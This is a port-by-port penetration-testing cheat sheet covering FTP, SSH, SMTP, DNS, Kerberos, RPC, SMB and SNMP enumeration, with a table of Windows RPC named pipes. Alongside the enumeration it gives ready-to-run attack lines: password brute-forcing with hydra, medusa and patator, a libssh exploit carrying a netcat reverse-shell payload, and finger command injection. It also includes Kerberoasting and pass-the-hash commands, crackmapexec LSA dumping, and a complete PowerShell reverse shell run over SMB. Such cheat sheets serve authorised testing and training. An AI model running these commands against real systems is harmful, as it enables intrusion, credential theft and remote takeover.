# Ports

## General

AIO [Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)

## Port 21 - FTP

```bash
nmap --script ftp-* -p 21 10.11.1.111
```

## Port 22 - SSH

* If you have usernames test login with username:username
* Vulnerable Versions to user enum: <7.7

```bash
# Enum SSH
# Get version
nmap 10.11.1.1 -p22 -sV
# Get banner
nc 10.11.1.1 22
# Get login banner
ssh root@10.11.11.1
# Get algorythms supporteed
nmap -p22 10.11.1.1 --script ssh2-enum-algos
# Check weak keys
nmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=full
# Check auth methods
nmap -p22 10.11.1.1 --script ssh-auth-methods --script-args="ssh.user=admin"

# User can ask to execute a command right after authentication before it’s default command or shell is executed
$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

# Check Auth Methods:
$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

# Force Auth Method:
$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

# BruteForce:
patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

# LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
# Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
# Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

# SSH FUZZ
# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

# cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

# SSH-AUDIT
# https://github.com/arthepsy/ssh-audit                     

# Enum users < 7.7:
# https://www.exploit-db.com/exploits/45233
https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"

# SSH Leaks:
https://shhgit.darkport.co.uk/

# SSH bruteforce
# https://github.com/kitabisa/ssb
```

## Port 23 - Telnet

```bash
# Get banner
telnet 10.11.1.110
# Bruteforce password
patator telnet_login host=10.11.1.110 inputs='FILE0\nFILE1' 0=/root/Desktop/user.txt 1=/root/Desktop/pass.txt  persistent=0 prompt_re='Username: | Password:'
```

## Port 25 - SMTP

```bash
nc -nvv 10.11.1.111 25
HELO foo

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

# SMTP relay
msfconsole
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS <IP or File>
set MAILFROM <PoC email address>
set MAILTO <your email address>
run

# Send email unauth:

MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test

.

Receive:
250 OK
```

## Port 43 - Whois

```bash
whois -h 10.10.1.111 -p 43 "domain.com"
echo "domain.com" | nc -vn 10.10.1.111 43
whois -h 10.10.1.111 -p 43 "a') or 1=1#"
```

## Port 53 - DNS

```bash
# Transfer zone

dig AXFR domain.com @10.10.10.10
# dig +multi AXFR @ns1.insecuredns.com insecuredns.com
dnsrecon -t axfr -d domain
fierce -dns domain.com
```

## Port 69 - UDP - TFTP

* Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
* Same checks as FTP Port 21.

```bash
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

## Port 79 - Finger

```bash
nc -vn 10.11.1.111 79
echo "root" | nc -vn 10.11.1.111 79

# User enumeration
finger @10.11.1.111       #List users
finger admin@10.11.1.111  #Get info of user
finger user@10.11.1.111   #Get info of user

finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

## Port 88 - Kerberos

Check [Kerberos dedicated](../post-exploitation/windows/ad/kerberos-attacks.md) section

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP
use auxiliary/gather/kerberos_enumusers # MSF

# Check for Kerberoasting: 
GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john

# GetUserSPNs
ASREPRoast:
impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# Kerberoasting: 
impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 

# Overpass The Hash/Pass The Key (PTK):
python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
python3 getTGT.py <domain_name>/<user_name>:[password]

# Using TGT key to excute remote commands from the following impacket scripts:

python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# https://www.tarlogic.com/blog/como-funciona-kerberos/
# https://www.tarlogic.com/blog/como-atacar-kerberos/

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

# https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
# https://github.com/GhostPack/Rubeus
# https://github.com/fireeye/SSSDKCMExtractor
# https://gitlab.com/Zer1t0/cerbero
```

## Port 110 - Pop3

```bash
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

# or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

## Port 111 - Rpcbind

```bash
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

## Port 135 - MSRPC

Some versions are vulnerable.

```bash
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom

# Endpoint Mapper Service Discovery
use auxiliary/scanner/dcerpc/endpoint_mapper

#Hidden DCERPC Service Discovery
use auxiliary/scanner/dcerpc/hidden

# Remote Management Interface Discovery
use auxiliary/scanner/dcerpc/management

# DCERPC TCP Service Auditor
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

impacket-rpcdump

# Enum network interface
# https://github.com/mubix/IOXIDResolver
```



| Named pipe | Description | Service or process | Interface identifier |
| ---------- | ----------- | ------------------ | -------------------- |

| atsvc | [atsvc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_scheduler.html) interface (Scheduler service) | mstask.exe | 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 |
| ----- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------------------------------------- |

| AudioSrv | [AudioSrv](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_audio.html) interface (Windows Audio service) | AudioSrv | 3faf4738-3a21-4307-b46c-fdda9bb8c0d5 v1.0 |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| browser (ntsvcs alias) | [browser](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_browser.html) interface (Computer Browser service) | Browser | 6bffd098-a112-3610-9833-012892020162 v0.0 |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------- | ----------------------------------------- |

| cert | [ICertPassage](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_certsrv.html) interface (Certificate services) | certsrv.exe | 91ae6020-9e3c-11cf-8d7c-00aa00c091be v0.0 |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| Ctx\_Winstation\_API\_Service | [winstation\_rpc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_termsrv.html) interface | termsrv.exe | 5ca4a760-ebb1-11cf-8611-00a0245420ed v1.0 |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| DAV RPC SERVICE | [davclntrpc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_davclntrpc.html) interface (WebDAV client service) | WebClient | c8cb7687-e6d3-11d2-a958-00c04f682e16 v1.0 |
| --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| dnsserver | [DnsServer](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_dns.html) interface (DNS Server service) | dns.exe | 50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0 |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ----------------------------------------- |

| epmapper | [epmp](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/rpcss\_msrpc\_interfaces.html) interface (RPC endpoint mapper) | RpcSs | e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0 |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----- | ----------------------------------------- |

| eventlog (ntsvcs alias) | [eventlog](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_eventlog.html) interface (Eventlog service) | Eventlog | 82273fdc-e32a-18c3-3f78-827929dc23ea v0.0 |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------- | ----------------------------------------- |

| HydraLsPipe | Terminal Server Licensing | lserver.exe | 3d267954-eeb7-11d1-b94e-00c04fa3080d v1.0 |
| ----------- | ------------------------- | ----------- | ----------------------------------------- |

| InitShutdown | [InitShutdown](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winlogon\_w2k.html) interface | winlogon.exe | 894de0c0-0d55-11d3-a322-00c04fa321a1 v1.0 |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------------------------------- |

| keysvc | [IKeySvc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_cryptsvc.html) interface (Cryptographic services) | CryptSvc | 8d0ffe72-d252-11d0-bf8f-00c04fd9126b v1.0 |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| keysvc | [ICertProtect](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_cryptsvc.html) interface (Cryptographic services) | CryptSvc | 0d72a7d4-6148-11d1-b4aa-00c04fb66ea0 v1.0 |
| ------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| locator | [NsiS](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_locator.html) interface (RPC Locator service) | locator.exe | d6d70ef0-0e3b-11cb-acc3-08002b1d29c4 v1.0 |
| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| llsrpc | [llsrpc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_llsrpc.html) interface (Licensing Logging service) | llssrv.exe | 342cfd40-3c6c-11ce-a893-08002b2e9c6d v0.0 |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------------------------------------- |

| lsarpc (lsass alias) | [lsarpc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_lsarpc.html) interface | lsass.exe | 12345778-1234-abcd-ef00-0123456789ab v0.0 |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| lsarpc (lsass alias) | [dssetup](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_dssetup.html) interface | lsass.exe | 3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0 |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| msgsvc (ntsvcs alias) | [msgsvcsend](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_msgsvc.html) interface (Messenger service) | messenger | 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc v1.0 |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| nddeapi | [nddeapi](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_nddeapi.html) interface (NetDDE service) | netdde.exe | 2f5f3220-c126-1076-b549-074d078619da v1.2 |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------------------------------------- |

| netdfs | [netdfs](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_netdfs.html) interface (Distributed File System service) | Dfssvc | 4fc742e0-4a10-11cf-8273-00aa004ae673 v3.0 |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | ----------------------------------------- |

| netlogon (lsass alias) | [netlogon](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_netlogon.html) interface (Net Logon service) | Netlogon | 12345678-1234-abcd-ef00-01234567cffb v1.0 |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| ntsvcs | [pnp](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_pnp.html) interface (Plug and Play service) | PlugPlay | 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0 |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| plugplay | [pnp](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_pnp.html) interface (Plug and Play Windows Vista service) | PlugPlay | 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0 |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| policyagent | [PolicyAgent](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_ipsec\_w2k.html) interface (IPSEC Policy Agent (Windows 2000)) | PolicyAgent | d335b8f6-cb31-11d0-b0f9-006097ba4e54 v1.5 |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| ipsec | [winipsec](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winipsec.html) interface (IPsec Services) | PolicyAgent | 12345678-1234-abcd-ef00-0123456789ab v1.0 |
| ----- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| ProfMapApi | [pmapapi](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winlogon\_w2k.html) interface | winlogon.exe | 369ce4f0-0fdc-11d3-bde8-00c04f8eee78 v1.0 |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------------------------------- |

| protected\_storage | [IPStoreProv](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_protected\_storage.html) interface (Protected Storage) | lsass.exe | c9378ff1-16f7-11d0-a0b2-00aa0061426a v1.0 |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| ROUTER | Remote Access | mprdim.dll | 8f09f000-b7ed-11ce-bbd2-00001a181cad v0.0 |
| ------ | ------------- | ---------- | ----------------------------------------- |

| samr (lsass alias) | [samr](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_samr.html) interface | lsass.exe | 12345778-1234-abcd-ef00-0123456789ac v1.0 |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |

| scerpc | [SceSvc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_sce.html) | services.exe | 93149ca2-973b-11d1-8c39-00c04fb984f9 v0.0 |
| ------ | ------------------------------------------------------------------------------------------------------------------------ | ------------ | ----------------------------------------- |

| SECLOGON | [ISeclogon](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_seclogon.html) interface (Secondary logon service) | seclogon | 12b81e99-f207-4a4c-85d3-77b42f76fd14 v1.0 |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| SfcApi | [sfcapi](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_sfcapi.html) interface (Windows File Protection) | winlogon.exe | 83da7c00-e84f-11d2-9807-00c04f8ec850 v2.0 |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------------------------------- |

| spoolss | [spoolss](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_spoolss.html) interface (Spooler service) | spoolsv.exe | 12345678-1234-abcd-ef00-0123456789ab v1.0 |
| ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------- |

| srvsvc (ntsvcs alias) | [srvsvc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_srvsvc.html) interface (Server service) | services.exe (w2k) or svchost.exe (wxp and w2k3) | 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0 |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------ | ----------------------------------------- |

| ssdpsrv | [ssdpsrv](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_ssdpsrv.html) interface (SSDP service) | ssdpsrv | 4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ | ------- | ----------------------------------------- |

| svcctl (ntsvcs alias) | [svcctl](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_svcctl.html) interface (Services control manager) | services.exe | 367aeb81-9844-35f1-ad32-98f038001003 v2.0 |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------------------------------- |

| tapsrv | [tapsrv](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_tapsrv.html) interface (Telephony service) | Tapisrv | 2f5f6520-ca46-1067-b319-00dd010662da v1.0 |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ----------------------------------------- |

| trkwks | [trkwks](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_trkwks.html) interface (Distributed Link Tracking Client) | Trkwks | 300f3532-38cc-11d0-a3f0-0020af6b0add v1.2 |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------ | ----------------------------------------- |

| W32TIME (ntsvcs alias) | [w32time](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_w32time.html) interface (Windows Time (Windows 2000 and XP)) | w32time | 8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1 |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ----------------------------------------- |

| W32TIME\_ALT | [w32time](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_w32time.html) interface (Windows Time (Windows Server 2003, Windows Vista)) | w32time | 8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1 |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ----------------------------------------- |

| winlogonrpc | [GetUserToken](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winlogon\_w2k.html) interface | winlogon.exe | a002b3a0-c9b7-11d1-ae88-0080c75e4ec1 v1.0 |
| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------------------------------- |

| winreg | [winreg](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winreg.html) interface (Remote registry service) | RemoteRegistry | 338cd001-2244-31f1-aaaa-900038001003 v1.0 |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | ----------------------------------------- |

| winspipe | [winsif](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_winsif.html) interface (WINS service) | wins.exe | 45f52c28-7f9f-101a-b52b-08002b2efabe v1.0 |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | ----------------------------------------- |

| wkssvc (ntsvcs alias) | [wkssvc](https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win\_net\_srv/msrpc\_wkssvc.html) interface (Workstation service) | services.exe (w2k) or svchost.exe (wxp and w2k3) | 6bffd098-a112-3610-9833-46c3f87e345a v1.0 |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ | ----------------------------------------- |

## Port 139/445 - SMB

```bash
# Enum hostname
enum4linux -n 10.11.1.111
nmblookup -A 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111

# Get Version
smbver.sh 10.11.1.111
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 
smbclient -L \\\\10.11.1.111

# Get Shares
smbmap -H  10.11.1.111 -R 
echo exit | smbclient -L \\\\10.11.1.111
smbclient \\\\10.11.1.111\\
smbclient -L //10.11.1.111 -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
smbclient -L \\\\10.11.1.111\\
# If got error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
smbclient -L //10.11.1.111/ --option='client min protocol=NT1'

# Check null sessions
smbmap -H 10.11.1.111
rpcclient -U "" -N 10.11.1.111
smbclient //10.11.1.111/IPC$ -N

# Exploit null sessions
enum -s 10.11.1.111
enum -U 10.11.1.111
enum -P 10.11.1.111
enum4linux -a 10.11.1.111
#https://github.com/cddmp/enum4linux-ng/
enum4linux-ng.py 10.11.1.111 -A -C
/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111

# Connect to username shares
smbclient //10.11.1.111/share -U username

# Connect to share anonymously
smbclient \\\\10.11.1.111\\
smbclient //10.11.1.111/
smbclient //10.11.1.111/
smbclient //10.11.1.111/<""share name"">
rpcclient -U " " 10.11.1.111
rpcclient -U " " -N 10.11.1.111

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run

# Bruteforce login
medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
nmap –script smb-brute 10.11.1.111

# nmap smb enum & vuln 
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# rpcclient commands
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

# smbmap
smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "

# CrackMapExec
crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local
crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local --lsa

# Impacket
python3 samdump.py SMB 172.21.0.0

# Check for systems with SMB Signing not enabled
python3 RunFinger.py -i 172.21.0.0/24
```

## Port 161/162 UDP - SNMP

```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
nmap 10.11.1.111 -Pn -sU -p 161 --script=snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users
snmp-check 10.11.1.111 -c public|private|community
snmpwalk -c public -v1 ipaddress 1
snmpwalk -c private -v1 ipaddress 1
snmpwalk -c manager -v1 ipaddress 1
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 172.21.0.X

# Impacket
python3 samdump.py SNMP 172.21.0.0 

# MSF aux modules
 auxiliary/scanner/misc/oki_scanner                                    
 auxiliary/scanner/snmp/aix_version                                   
 auxiliary/scanner/snmp/arris_dg950                                   
 auxiliary/scanner/snmp/brocade_enumhash                               
 auxiliary/scanner/snmp/cisco_config_tftp                               
 auxiliary/scanner/snmp/cisco_upload_file                              
 auxiliary/scanner/snmp/cnpilot_r_snmp_loot                             
